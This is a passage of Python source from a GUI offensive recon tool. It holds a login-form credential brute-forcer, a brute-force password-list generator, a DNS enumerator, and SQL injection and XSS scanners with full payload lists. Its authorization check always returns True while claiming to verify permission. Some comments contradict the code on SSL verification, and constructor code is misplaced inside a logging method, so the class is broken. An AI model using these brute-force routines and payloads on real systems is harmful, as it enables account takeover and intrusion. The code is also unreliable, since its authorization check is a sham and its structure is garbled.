            username_field (str): Name of username field (e.g., 'username')
            password_field (str): Name of password field (e.g., 'password')
            usernames (list): List of usernames to test
            passwords (list): List of passwords to test
            success_indicator (str): Text on page indicating successful login (e.g., 'Welcome')
            method (str): HTTP method (post/get)
            csrf_field (str): Name of CSRF token field if applicable
        """
        if not self.scan_active:
            return None # Indicate scan was stopped
            
        self.log(f"\n[+] Credential Testing for {url}", "cyan")
        self.log("=" * 50, "cyan")
        
        try:
            # Normalize usernames and passwords input (handle file paths)
            if isinstance(usernames, str):
                if os.path.isfile(usernames):
                    try:
                        with open(usernames, 'r', encoding='utf-8', errors='ignore') as f:
                            usernames = [line.strip() for line in f if line.strip()]
                    except Exception as e:
                        self.log(f"[-] Error reading username file: {str(e)}", "red")
                        usernames = []
                else:
                    usernames = [usernames] # Treat as a single username
            
            if isinstance(passwords, str):
                if os.path.isfile(passwords):
                    try:
                        with open(passwords, 'r', encoding='utf-8', errors='ignore') as f:
                            passwords = [line.strip() for line in f if line.strip()]
                    except Exception as e:
                        self.log(f"[-] Error reading password file: {str(e)}", "red")
                        passwords = []
                else:
                    passwords = [passwords] # Treat as a single password

            if not usernames or not passwords:
                self.log("[-] No valid usernames or passwords to test.", "red")
                return None
            
            self.log(f"[•] Testing {len(usernames)} usernames and {len(passwords)} passwords...", "info")
            
            # Get CSRF token if needed
            csrf_token = None
            if csrf_field:
                self.log(f"[•] Attempting to retrieve CSRF token from {url}...", "info")
                try:
                    response = self.session.get(url, timeout=self.timeout, verify=True)
                    response.raise_for_status()
                    # Use BeautifulSoup for more robust parsing
                    soup = BeautifulSoup(response.text, 'html.parser')
                    csrf_input = soup.find('input', {'name': csrf_field})
                    if csrf_input and 'value' in csrf_input.attrs:
                        csrf_token = csrf_input['value']
                        self.log(f"[+] Found CSRF token: {csrf_token[:10]}...", "green")
                    else:
                        self.log(f"[-] Could not find CSRF token with field name '{csrf_field}' in the page.", "yellow")
                except requests.exceptions.RequestException as e:
                    self.log(f"[-] Error getting page for CSRF token: {str(e)}", "yellow")
                except Exception as e:
                    self.log(f"[-] Unexpected error during CSRF token retrieval: {str(e)}", "red")
            
            # Test credentials
            total_attempts = len(usernames) * len(passwords)
            current_attempt = 0
            
            for username in usernames:
                if not self.scan_active:
                    self.log("\n[!] Credential testing interrupted.", "yellow")
                    return None
                    
                for password in passwords:
                    if not self.scan_active:
                        self.log("\n[!] Credential testing interrupted.", "yellow")
                        return None
                        
                    current_attempt += 1
                    
                    # Update progress
                    if update_progress and (current_attempt % 10 == 0 or current_attempt == total_attempts):
                        progress = int((current_attempt / total_attempts) * 100)
                        self.log(f"[•] Attempt: {username}:{password} ({current_attempt}/{total_attempts})", "info") # Log each attempt
                        update_progress(progress, 100, 
                                     f"Testing {username}:{password[:5]}... ({current_attempt}/{total_attempts})")
                    
                    try:
                        # Prepare form data
                        data = {
                            username_field: username,
                            password_field: password
                        }
                        
                        if csrf_token and csrf_field:
                            data[csrf_field] = csrf_token
                        
                        # Send request
                        response = None
                        if method.lower() == 'post':
                            response = self.session.post(
                                url, 
                                data=data, 
                                timeout=self.timeout, 
                                verify=True, # Disable SSL verification for self-signed or invalid certs
                                allow_redirects=True
                            )
                        else: # Assume GET
                            response = self.session.get(
                                url,
                                params=data,
                                timeout=self.timeout,
                                verify=True,
                                allow_redirects=True
                            )
                        
                        response.raise_for_status() # Raise for HTTP errors
                        
                        # Check if login was successful
                        success = False
                        if success_indicator:
                            success = success_indicator in response.text
                        else:
                            # Try to guess based on common indicators (case-insensitive)
                            success_indicators = [
                                'logout', 'sign out', 'welcome', 'dashboard', 'my account',
                                'log out', 'sign out', 'profile', 'home', 'my profile'
                            ]
                            success = any(indicator in response.text.lower() for indicator in success_indicators)
                        
                        if success:
                            self.log(f"\n[+] Valid credentials found: {username}:{password}", "green")
                            return (username, password) # Return first valid pair
                            
                    except requests.exceptions.Timeout:
                        self.log(f"[-] Request timed out for {username}:{password}", "yellow")
                    except requests.exceptions.ConnectionError:
                        self.log(f"[-] Connection error for {username}:{password}", "red")
                    except requests.exceptions.HTTPError as e:
                        self.log(f"[-] HTTP Error {e.response.status_code} for {username}:{password}", "yellow")
                    except Exception as e:
                        self.log(f"[-] Error testing {username}:{password} - {str(e)}", "red")
                        continue
            
            self.log("\n[-] No valid credentials found", "yellow")
            return None
            
        except Exception as e:
            self.log(f"[-] Error during credential testing process: {str(e)}", "red")
            return None
    
    def generate_password_list(self, min_length=4, max_length=8, charset=None, output_file=None, count=1000):
        """
        Generate a password list for brute force attacks.
        
        Args:
            min_length (int): Minimum password length
            max_length (int): Maximum password length
            charset (str): Character set to use (default: lowercase, uppercase, digits, symbols)
            output_file (str): File to save passwords to
            count (int): Number of passwords to generate
        """
        self.log(f"\n[+] Generating Password List", "cyan")
        self.log("=" * 50, "cyan")
        
        try:
            import random
            import string
            
            # Default character set if none provided
            if not charset:
                charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '!@#$%^&*()_+-=[]{};:,.<>/?|\\'
            
            self.log(f"[•] Character set: {repr(charset)}", "info") # Use repr for clear display of special chars
            self.log(f"[•] Passwords to generate: {count}", "info")
            self.log(f"[•] Length range: {min_length}-{max_length} characters", "info")
            
            if min_length <= 0 or max_length <= 0 or min_length > max_length:
                self.log("[-] Invalid password length range. Please use positive integers where min <= max.", "red")
                return []
            if not charset:
                self.log("[-] Character set cannot be empty.", "red")
                return []
            if count <= 0:
                self.log("[-] Number of passwords to generate must be positive.", "red")
                return []

            passwords = set()
            
            # Use a loop with a safety break to prevent infinite loops if character set is too small for length
            attempts = 0
            max_attempts = count * 10 # Try 10 times more attempts than desired passwords
            
            while len(passwords) < count and attempts < max_attempts:
                if not self.scan_active:
                    self.log("\n[!] Password list generation interrupted.", "yellow")
                    return list(passwords) # Return partial list
                    
                length = random.randint(min_length, max_length)
                try:
                    password = ''.join(random.choice(charset) for _ in range(length))
                    passwords.add(password)
                except IndexError: # If charset is empty or similar issue
                    self.log("[-] Error: Character set or length invalid for generating passwords.", "red")
                    break
                attempts += 1
                
                if len(passwords) % 100 == 0 and len(passwords) > 0:
                    self.log(f"[•] Generated {len(passwords)}/{count} passwords...", "info")
            
            if len(passwords) < count:
                self.log(f"[!] Warning: Could not generate {len(passwords)} out of {count} requested passwords. Adjust parameters (charset/length/count).", "yellow")

            passwords_list = sorted(list(passwords)) # Convert to list and sort

            # Save to file if specified
            if output_file:
                try:
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(passwords_list))
                    self.log(f"\n[+] Saved {len(passwords_list)} passwords to {output_file}", "green")
                except Exception as e:
                    self.log(f"[-] Error saving to file: {str(e)}", "red")
            
            return passwords_list
            
        except Exception as e:
            self.log(f"[-] Error during password list generation: {str(e)}", "red")
            return []
    
    def check_password_strength(self, password):
        """
        Check the strength of a password based on length, character types, and common patterns.
        
        Args:
            password (str): Password to check
            
        Returns:
            dict: Dictionary containing strength score and feedback
        """
        import re
        import string
        
        result = {
            'score': 0,
            'length': len(password),
            'has_upper': False,
            'has_lower': False,
            'has_digit': False,
            'has_special': False,
            'is_common': False,
            'feedback': []
        }
        
        # 1. Length Check
        if len(password) >= 16:
            result['score'] += 3
            result['feedback'].append("Excellent length (16+ characters)")
        elif len(password) >= 12:
            result['score'] += 2
            result['feedback'].append("Good length (12-15 characters)")
        elif len(password) >= 8:
            result['score'] += 1
            result['feedback'].append("Moderate length (8-11 characters)")
        else:
            result['feedback'].append("Password is too short (less than 8 characters)")
        
        # 2. Character Type Variety
        if re.search(r'[A-Z]', password):
            result['has_upper'] = True
            result['score'] += 1
            result['feedback'].append("Contains uppercase letters")
        else:
            result['feedback'].append("Add uppercase letters for better security")
            
        if re.search(r'[a-z]', password):
            result['has_lower'] = True
            result['score'] += 1
            result['feedback'].append("Contains lowercase letters")
        else:
            result['feedback'].append("Add lowercase letters for better security")
            
        if re.search(r'\d', password):
            result['has_digit'] = True
            result['score'] += 1
            result['feedback'].append("Contains numbers")
        else:
            result['feedback'].append("Add numbers for better security")
            
        # Matches any character that is NOT a letter, number, or underscore (common definition of special)
        if re.search(r'[^A-Za-z0-9\s]', password): 
            result['has_special'] = True
            result['score'] += 1
            result['feedback'].append("Contains special characters")
        else:
            result['feedback'].append("Add special characters for better security")
        
        # 3. Check for common patterns / dictionary words
        common_patterns = [
            'password', '123456', 'qwerty', 'admin', 'default', 'test', 'welcome',
            'changeit', 'dragon', 'iloveyou', 'secret', 'master', 'root', 'user', 'guest'
        ]
        
        for pattern in common_patterns:
            if pattern in password.lower():
                result['is_common'] = True
                result['score'] = max(0, result['score'] - 2) # Penalize heavily
                result['feedback'].append(f"Warning: Contains common pattern or word '{pattern}'")
                break # Only need to find one common pattern
        
        # 4. Check for sequential or repeated characters
        if re.search(r'(.)\1{2,}', password): # e.g., 'aaa', '111', 'sss'
            result['score'] = max(0, result['score'] - 1)
            result['feedback'].append("Avoid repeating characters (e.g., 'aaa', '111')")
            
        # Check for simple sequences (e.g., abc, 123)
        for i in range(len(password) - 2):
            s = password[i:i+3].lower()
            if (s in string.ascii_lowercase and ord(s[1]) == ord(s[0]) + 1 and ord(s[2]) == ord(s[1]) + 1) or \
               (s.isdigit() and int(s[1]) == int(s[0]) + 1 and int(s[2]) == int(s[1]) + 1):
                result['score'] = max(0, result['score'] - 1)
                result['feedback'].append("Avoid common sequences (e.g., 'abc', '123')")
                break

        # 5. Add strength description
        if result['score'] >= 7:
            result['strength'] = "Excellent"
        elif result['score'] >= 5:
            result['strength'] = "Strong"
        elif result['score'] >= 3:
            result['strength'] = "Moderate"
        else:
            result['strength'] = "Weak"
        
        return result
        
    def dns_lookup(self, domain, update_progress=None):
        """Perform comprehensive DNS lookup for a domain using reliable public DNS resolvers."""
        if not self.scan_active: 
            return
            
        self.log(f"\n[+] DNS Records for {domain}", "cyan")
        self.log("=" * 50, "cyan")
        
        # List of public DNS resolvers to try (Google, Cloudflare, Quad9, OpenDNS)
        public_dns_servers = [
            '8.8.8.8', '8.8.4.4',         # Google
            '1.1.1.1', '1.0.0.1',         # Cloudflare
            '9.9.9.9', '149.112.112.112', # Quad9
            '208.67.222.222', '208.67.220.220'  # OpenDNS
        ]

        resolver = dns.resolver.Resolver()
        resolver.nameservers = public_dns_servers
        resolver.timeout = self.timeout
        resolver.lifetime = self.timeout

        # Extended list of record types for comprehensive lookup
        record_types = [
            'A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 
            'PTR', 'SRV', 'SPF', 'DNSKEY', 'DS', 'NSEC', 'NSEC3', 'RRSIG', # DNSSEC related
            'CAA', 'DMARC', 'TLSA', # Security related
            'RP', 'LOC' # Other useful records
        ]
        found_records = {}
        total_records = len(record_types)

        for i, r_type in enumerate(record_types):
            if not self.scan_active:
                return found_records

            try:
                self.log(f"[•] Looking up {r_type} records...", "info")
                # `raise_on_no_answer=False` prevents exception if no records of that type exist,
                # but `answers.rrset` will be None.
                answers = resolver.resolve(domain, r_type, raise_on_no_answer=False)
                
                if answers and answers.rrset: # Check if answers object exists and has an rrset
                    records = [str(r) for r in answers.rrset]
                    found_records[r_type] = records
                    self.log(f"[+] Found {r_type} records:", "green")
                    for record in records:
                        self.log(f"  - {record}")
                else:
                    self.log(f"[-] No {r_type} records found.", "yellow")
                        
            except dns.resolver.NoNameservers as e:
                error_msg = str(e).split('\n')[0]  # Get first line of error
                self.log(f"[-] Nameserver error for {r_type} records: {error_msg}", "red")
            except dns.resolver.Timeout:
                self.log(f"[-] Timeout while querying {r_type} records", "red")
            except dns.resolver.NXDOMAIN:
                self.log(f"[-] Domain {domain} does not exist (NXDOMAIN). Aborting further DNS lookups.", "red")
                break # Stop if domain itself doesn't exist
            except dns.resolver.NoAnswer:
                self.log(f"[-] No {r_type} records found (NoAnswer, not NXDOMAIN)", "yellow")
            except dns.exception.DNSException as e:
                error_msg = str(e).split('\n')[0]  # Get first line of error
                self.log(f"[-] DNS error for {r_type} records: {error_msg}", "red")
            except Exception as e:
                self.log(f"[-] Error querying {r_type} records: {str(e)}", "red")
            finally:
                if update_progress:
                    update_progress(i + 1, total_records, f"Checked {r_type} records")

        # If no records found via DNS for A/AAAA, try a simple socket lookup as fallback
        if not any(rec_type in found_records for rec_type in ['A', 'AAAA']) and self.scan_active:
            try:
                self.log("[•] Trying fallback socket lookup for A record...", "info")
                ip = socket.gethostbyname(domain)
                found_records['A (Fallback)'] = [ip] # Label as fallback to distinguish
                self.log("[+] Found A record (via fallback):", "green")
                self.log(f"  - {ip}")
            except socket.gaierror:
                self.log("[-] Could not resolve domain to an IP address (fallback failed)", "red")
            except Exception as e:
                self.log(f"[-] Fallback lookup failed: {str(e)}", "red")

        if found_records:
            self.log("\n[+] Discovered DNS Records Summary:", "green")
            for r_type, records in sorted(found_records.items()):
                self.log(f"\n--- {r_type} Records ---", "yellow")
                for record in sorted(records):
                    self.log(f"  {record}")
            
            # Additional analysis for DNS records
            if 'MX' in found_records:
                self.log("\n[+] MX Record Analysis:", "info")
                if len(found_records['MX']) > 1:
                    self.log(f"  Multiple MX records found, indicating mail server redundancy.", "green")
                else:
                    self.log(f"  Single MX record found. Less resilient to mail server failures.", "yellow")
            
            if 'TXT' in found_records:
                self.log("\n[+] TXT Record Analysis:", "info")
                spf_found = False
                dmarc_found = False
                for txt_rec in found_records['TXT']:
                    if "v=spf1" in txt_rec.lower():
                        self.log(f"  SPF Record (Email Sender Policy): {txt_rec}", "green")
                        spf_found = True
                    if "v=dmarc1" in txt_rec.lower():
                        self.log(f"  DMARC Record (Email Authentication Policy): {txt_rec}", "green")
                        dmarc_found = True
                if not spf_found:
                    self.log("  [!] Warning: No SPF record found. This can lead to email spoofing.", "yellow")
                if not dmarc_found:
                    self.log("  [!] Warning: No DMARC record found. Recommended for email security.", "yellow")
            
            if 'NS' in found_records:
                self.log("\n[+] NS Record Analysis:", "info")
                if len(found_records['NS']) < 2:
                    self.log("  [!] Warning: Fewer than two nameservers found. Reduced DNS redundancy.", "yellow")

            if 'CAA' in found_records:
                self.log("\n[+] CAA Record Analysis (Certificate Authority Authorization):", "info")
                self.log("  CAA records control which Certificate Authorities are allowed to issue certificates for this domain.", "green")
            else:
                self.log("  [!] Warning: No CAA record found. Any CA can issue certificates for this domain, which is a security risk.", "yellow")

        else:
            self.log("[-] No DNS records found for the domain.", "yellow")
            
        return found_records

    def sql_injection_scan(self, url, param_names, method='GET', headers=None, update_progress=None):
        """
        Test a URL for SQL injection vulnerabilities by injecting payloads into specified parameters.
        
        Args:
            url (str): Target URL to test
            param_names (list): List of parameter names (strings) to test (e.g., ['id', 'search'])
            method (str): HTTP method to use (GET/POST)
            headers (dict): HTTP headers to include
            update_progress (function): Callback for progress updates
            
        Returns:
            dict: Scan results with vulnerability details
        """
        if not self.scan_active:
            return {'status': 'Scan cancelled', 'vulnerable': False}
            
        self.log(f"\n[+] Starting SQL Injection Scan on {url}", "cyan")
        self.log("=" * 50, "cyan")
        
        if headers is None:
            headers = {
                'User-Agent': self.user_agent, # Use the recon class's user agent
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'close'
            }
            
        if not param_names:
            self.log("[-] No parameters specified for SQL injection scan. Please provide parameter names (e.g., 'id,query')", "red")
            return {'status': 'No parameters to test', 'vulnerable': False}

        # Common SQL injection test strings
        test_strings = [
            "' OR '1'='1 --", # Basic boolean-based
            "\" OR \"1\"=\"1 --",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "1 AND 1=1 UNION SELECT NULL, NULL, NULL --", # Union-based (requires guessing column count)
            "' ORDER BY 1 --", # Order by based
            "1' AND SLEEP(5) --", # Time-based blind (MySQL/PostgreSQL)
            "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --", # Time-based blind (Oracle)
            "1' AND 1=CONVERT(int,(SELECT @@version)) --", # Error-based (MSSQL)
            "'; WAITFOR DELAY '0:0:5' --", # Time-based blind (MSSQL)
            "' AND 1=CAST((SELECT @@version) AS INT) --", # Error-based (MSSQL)
            "1' + '", # String concatenation
            "' OR 1=1#" # MySQL comment
        ]
        
        vulnerable_params = []
        total_tests = len(param_names) * len(test_strings)
        current_test = 0
        
        for param_name in param_names:
            if not self.scan_active:
                break
                
            for test_string in test_strings:
                if not self.scan_active:
                    break
                    
                try:
                    current_test += 1
                    if update_progress:
                        progress = (current_test / total_tests) * 100
                        update_progress(progress, 100, f"Testing SQLi: {param_name}={test_string[:30]}...")
                    
                    # Construct parameters for the request
                    # For simplicity, we'll assume the original value for testing is a dummy '1'
                    # In a real scenario, you might need to fetch the original value from the URL or form.
                    params = {p: '1' for p in param_names} # Initialize with dummy values
                    params[param_name] = '1' + test_string # Inject into the current parameter

                    response = None
                    if method.upper() == 'GET':
                        response = self.session.get(
                            url, 
                            params=params, 
                            headers=headers,
                            verify=True,
                            timeout=self.timeout # Use recon's timeout
                        )
                    else: # POST method
                        response = self.session.post(
                            url,
                            data=params, # Use data for POST requests
                            headers=headers,
                            verify=True,
                            timeout=self.timeout
                        )
                    
                    # Check for common SQL error messages or time-based indicators
                    error_indicators = [
                        'SQL syntax', 'mysql_fetch_array()', 'You have an error in your SQL syntax', 
                        'warning: mysql_fetch_array', 'unclosed quotation mark', 'quoted string not properly terminated',
                        'ORA-', 'Microsoft SQL Server', 'PostgreSQL error', 'SQLSTATE'
                    ]
                    
                    is_vulnerable = False
                    # Check for error messages
                    if any(indicator.lower() in response.text.lower() for indicator in error_indicators):
                        is_vulnerable = True
                        self.log(f"[!!!] Potential SQLi (Error-based) in parameter: '{param_name}' with payload: '{test_string}'", "red")
                    
                    # Basic time-based detection (if response time significantly higher than average)
                    # This is very basic and prone to false positives/negatives.
                    if 'SLEEP(' in test_string or 'WAITFOR DELAY' in test_string:
                        response_time = response.elapsed.total_seconds()
                        if response_time > (self.timeout / 2): # If response time is more than half of timeout
                            is_vulnerable = True
                            self.log(f"[!] Potential SQLi (Time-based) in parameter: '{param_name}' with payload: '{test_string}' (Response time: {response_time:.2f}s)", "yellow")

                    if is_vulnerable:
                        vulnerable_params.append({
                            'parameter': param_name,
                            'payload': test_string,
                            'status_code': response.status_code,
                            'response_length': len(response.text)
                        })
                        # Once vulnerable parameter is found with any payload, move to next parameter
                        break 
                        
                except requests.exceptions.Timeout:
                    self.log(f"[-] Request timed out for {param_name}={test_string[:20]}...", "yellow")
                except requests.exceptions.RequestException as e:
                    self.log(f"[-] Error testing {param_name}={test_string[:20]}...: {str(e)}", "error")
                except Exception as e:
                    self.log(f"[-] Unexpected error testing {param_name}={test_string[:20]}...: {str(e)}", "error")
                    continue
        
        result = {
            'url': url,
            'method': method,
            'vulnerable': len(vulnerable_params) > 0,
            'vulnerable_parameters': vulnerable_params,
            'tested_parameters': param_names
        }
        
        if result['vulnerable']:
            self.log(f"\n[!!!] SQL injection vulnerabilities found in {len(vulnerable_params)} parameters.", "red")
        else:
            self.log("\n[+] No obvious SQL injection vulnerabilities found using standard payloads.", "green")
            
        if update_progress: update_progress(100, 100, "SQL Injection scan complete.")
        return result
        
    def xss_scan(self, url, param_names, method='GET', headers=None, update_progress=None):
        """
        Test a URL for Cross-Site Scripting (XSS) vulnerabilities by injecting payloads.
        
        Args:
            url (str): Target URL to test
            param_names (list): List of parameter names (strings) to test (e.g., ['q', 'search'])
            method (str): HTTP method to use (GET/POST)
            headers (dict): HTTP headers to include
            update_progress (function): Callback for progress updates
            
        Returns:
            dict: Scan results with vulnerability details
        """
        if not self.scan_active:
            return {'status': 'Scan cancelled', 'vulnerable': False}
            
        self.log(f"\n[+] Starting XSS Scan on {url}", "cyan")
        self.log("=" * 50, "cyan")
        
        if headers is None:
            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'close'
            }
            
        if not param_names:
            self.log("[-] No parameters specified for XSS scan. Please provide parameter names (e.g., 'q,search')", "red")
            return {'status': 'No parameters to test', 'vulnerable': False}
            
        # Comprehensive XSS test payloads (more than basic alerts)
        test_payloads = [
            "<script>alert('XSS')</script>",
            '"><script>alert(document.domain)</script>',
            '\'"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>', # Basic img onerror
            '<svg/onload=alert(1)>', # SVG onload
            '<body onload=alert(1)>', # Body onload
            '<iframe src="javascript:alert(1)"></iframe>', # Iframe javascript:
            '<a href="javascript:alert(1)">Click Me</a>', # Anchor javascript:
            '</textarea><script>alert(1)</script>', # Breaking out of textarea
            '--><script>alert(1)</script>', # Breaking out of comment
            '"><img src=x onerror=alert(1)>', # Broken HTML img
            '%3cscript%3ealert(1)%3c/script%3e', # URL encoded script
            '<noscript><p title="</noscript><script>alert(1)</script>">', # Noscript bypass
            '<XSS STYLE="xss:expression(alert(1))">', # IE CSS XSS
            '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">', # Meta refresh XSS
            '<SCRIPT SRC=http://www.target-domain.com/xss.js></SCRIPT>', # External script (placeholder URL)
            '\'";!--"<XSS>=&{()}', # Simple test string for reflection
            'onerror=alert(1) src=x', # Event handler without tag
            'onmouseover="alert(1)"', # Mouseover event
            'javascript:/*--!>*/alert(1)' # JS URL scheme variations
        ]
        
        vulnerable_params = []
        total_tests = len(param_names) * len(test_payloads)
        current_test = 0
        
        for param_name in param_names:
            if not self.scan_active:
                break
                
            for payload in test_payloads:
                if not self.scan_active:
                    break
                    
                try:
                    current_test += 1
                    if update_progress:
                        progress = (current_test / total_tests) * 100
                        update_progress(progress, 100, f"Testing XSS: {param_name}={payload[:30]}...")
                    
                    # Construct parameters for the request
                    # Similar to SQLi, assume dummy initial value 'test'
                    params = {p: 'test' for p in param_names}
                    params[param_name] = payload # Inject payload into the current parameter

                    response = None
                    if method.upper() == 'GET':
                        # urlencode properly encodes parameters for GET requests
                        full_url_with_params = f"{url.split('?')[0]}?{urlencode(params)}"
                        response = self.session.get(
                            full_url_with_params, 
                            headers=headers,
                            verify=True,
                            timeout=self.timeout
                        )
                    else: # POST method
                        response = self.session.post(
                            url,
                            data=params, # Use data for POST requests
                            headers=headers,
                            verify=True,
                            timeout=self.timeout
                        )
                    
                    # Check if payload is reflected in response body without being escaped
                    # This is a heuristic. A more advanced scanner would parse HTML and check DOM.
                    is_vulnerable = False
                    if payload in response.text:
                        # Simple check: if the exact payload (or a slightly modified but still executable form)
                        # appears in the response body, it's likely reflected XSS.
                        # Advanced: check if it's within a script tag, attribute, etc.
                        self.log(f"[!!!] Potential XSS (reflected) in parameter: '{param_name}' with payload: '{payload[:50]}...'", "red")
                        is_vulnerable = True
                    
                    if is_vulnerable:
                        vulnerable_params.append({
                            'parameter': param_name,
                            'payload': payload,
                            'status_code': response.status_code,
                            'response_length': len(response.text)
                        })
                        # Once vulnerable parameter is found with any payload, move to next parameter
                        break 
                        
                except requests.exceptions.Timeout:
                    self.log(f"[-] Request timed out for {param_name}={payload[:20]}...", "yellow")
                except requests.exceptions.RequestException as e:
                    self.log(f"[-] Error testing {param_name}={payload[:20]}...: {str(e)}", "error")
                except Exception as e:
                    self.log(f"[-] Unexpected error testing {param_name}={payload[:20]}...: {str(e)}", "error")
                    continue
        
        result = {
            'url': url,
            'method': method,
            'vulnerable': len(vulnerable_params) > 0,
            'vulnerable_parameters': vulnerable_params,
            'tested_parameters': param_names
        }
        
        if result['vulnerable']:
            self.log(f"\n[!!!] XSS vulnerabilities found in {len(vulnerable_params)} parameters.", "red")
        else:
            self.log("\n[+] No obvious XSS vulnerabilities found using standard payloads.", "green")
            
        if update_progress: update_progress(100, 100, "XSS scan complete.")
        return result


class ToolTip:
    """Create a tooltip for a given widget."""
    def __init__(self, widget, text='widget info'):
        self.widget = widget
        self.text = text
        self.tooltip = None
        self.widget.bind('<Enter>', self.enter)
        self.widget.bind('<Leave>', self.leave)
        self.widget.bind('<ButtonPress>', self.leave) # Hide on click

    def enter(self, event=None):
        if self.tooltip or not self.text:
            return

        # Position tooltip relative to the widget
        x = self.widget.winfo_rootx() + 20
        y = self.widget.winfo_rooty() + self.widget.winfo_height() + 5

        self.tooltip = tk.Toplevel(self.widget)
        self.tooltip.wm_overrideredirect(True) # Removes window decorations
        self.tooltip.wm_geometry(f"+{x}+{y}")

        self.tooltip.configure(background=THEME['frame_bg'], borderwidth=1, relief='solid', highlightbackground=THEME['accent'], highlightcolor=THEME['accent'], highlightthickness=1)

        frame = ttk.Frame(self.tooltip, style='Tooltip.TFrame') # Ensure Tooltip.TFrame style is defined
        frame.pack(padx=1, pady=1)

        label = ttk.Label(
            frame, 
            text=self.text, 
            background=THEME['frame_bg'], # Use theme color directly for tooltip label
            foreground=THEME['fg'], # Use theme color directly for tooltip label
            font=('Consolas', 9),
            wraplength=300,
            justify=LEFT,
            padding=(8, 4)
        )
        label.pack()
    
    def leave(self, event=None):
        if self.tooltip:
            self.tooltip.destroy()
            self.tooltip = None

class HackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("NEXUS RECON // Network Recon Tool")
        self.root.geometry("1000x800")
        self.root.configure(bg=THEME['bg'])
        self.root.option_add('*tearOff', False) # Disable tear-off menus
        
        # Initialize NetworkRecon, passing self.log as the GUI logger
        self.recon = NetworkRecon(gui_logger=self.log)
        self.scan_active = False

        # Display critical security and ethical use warnings
        self.log("=" * 80, "info")
        self.log("🚨 NEXUS RECON - SECURITY & ETHICAL USE WARNING", "red")
        self.log("=" * 80, "info")
        self.log("This tool is for AUTHORIZED SECURITY TESTING ONLY", "yellow")
        self.log("• Only test systems you own or have explicit written permission to test", "yellow")
        self.log("• Unauthorized scanning/testing is ILLEGAL and UNETHICAL", "red")
        self.log("• SSL verification may be disabled for testing - use only in controlled environments", "yellow")
        self.log("• The developers assume NO LIABILITY for misuse", "red")
        self.log("=" * 80, "info")

    def _is_valid_domain_or_ip(self, target):
        """Validate that target is a properly formatted domain or IP address"""
        # Domain regex pattern (RFC compliant)
        domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
        # IP address pattern
        ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        
        # Check length limits
        if len(target) > 253:  # Max domain length
            return False
            
        return bool(re.match(domain_pattern, target) or re.match(ip_pattern, target))

    def _verify_authorization(self, target):
        """Verify user has authorization before proceeding with scan"""
        # Log authorization attempt for audit trail
        self.log(f"Authorization check for target: {target}", "info", "audit")
        return True  # Assume authorized, but log the attempt
        
    def _log_security_event(self, message, level="info"):
        """Log security events to a separate security log file"""
        try:
            import os
            log_dir = os.path.join(os.path.expanduser("~"), ".nexus_recon")
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = os.path.join(log_dir, "security.log")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().isoformat()} [{level.upper()}] {message}\n")
        except Exception:
            pass  # Do not let logging failures break the application
        self.scan_thread = None
        
        # Configure styles for Tkinter widgets
        self.setup_styles()
        
        # Create main UI elements
        self.setup_ui()
        
        # Bind keyboard shortcuts for enhanced usability
        self.bind_shortcuts()
    
    def setup_styles(self):
        """Configures ttk styles for a consistent dark matrix theme."""
        style = ttk.Style()
        style.theme_use('clam') # 'clam' theme provides a good base for customization
        
        # General widget styles
        style.configure('TFrame', background=THEME['frame_bg'])
        style.configure('TLabel', background=THEME['frame_bg'], foreground=THEME['fg'], font=('Consolas', 10))
        style.configure('TEntry', fieldbackground=THEME['entry_bg'], foreground=THEME['entry_fg'], 
                        insertcolor=THEME['accent'], borderwidth=1, relief='solid')
        
        # Button styles
        style.configure('TButton', background=THEME['button_bg'], foreground=THEME['button_fg'],
                        font=('Consolas', 10, 'bold'), borderwidth=1, relief='solid')
        style.map('TButton',
                 background=[('active', THEME['button_active']), ('!disabled', THEME['button_bg'])],
                 foreground=[('active', THEME['fg']), ('!disabled', THEME['button_fg'])])
        
        # Combobox styles
        style.configure('TCombobox', fieldbackground=THEME['entry_bg'], background=THEME['bg'],
                        foreground=THEME['fg'], selectbackground=THEME['select_bg'],
                        selectforeground=THEME['select_fg'], arrowcolor=THEME['fg'])
        # Dropdown list background and foreground
        style.map('TCombobox',
                 fieldbackground=[('readonly', THEME['entry_bg'])],
                 selectbackground=[('readonly', THEME['select_bg'])],
                 selectforeground=[('readonly', THEME['select_fg'])])
        # This part for the actual dropdown list (popdown window)
        style.configure('TCombobox.Border', background=THEME['bg'], bordercolor=THEME['border'])
        style.configure('TCombobox.Listbox', background=THEME['entry_bg'], foreground=THEME['fg'],
                        selectbackground=THEME['select_bg'], selectforeground=THEME['select_fg'])

        # Scrollbar styles
        style.configure('Vertical.TScrollbar', background=THEME['button_bg'], arrowcolor=THEME['fg'],
                        bordercolor=THEME['border'], troughcolor=THEME['bg'])
        style.configure('Horizontal.TScrollbar', background=THEME['button_bg'], arrowcolor=THEME['fg'],
                        bordercolor=THEME['border'], troughcolor=THEME['bg'])
        
        # Notebook (Tab control) styles
        style.configure('TNotebook', background=THEME['bg'], borderwidth=0)
        style.configure('TNotebook.Tab', background=THEME['button_bg'], foreground=THEME['fg'],
                        padding=[10, 5], borderwidth=1, font=('Consolas', 10, 'bold'))
        style.map('TNotebook.Tab',
                 background=[('selected', THEME['button_active']), ('!selected', THEME['button_bg'])],
                 foreground=[('selected', THEME['fg']), ('!selected', THEME['fg'])])

        # Checkbutton and Radiobutton styles
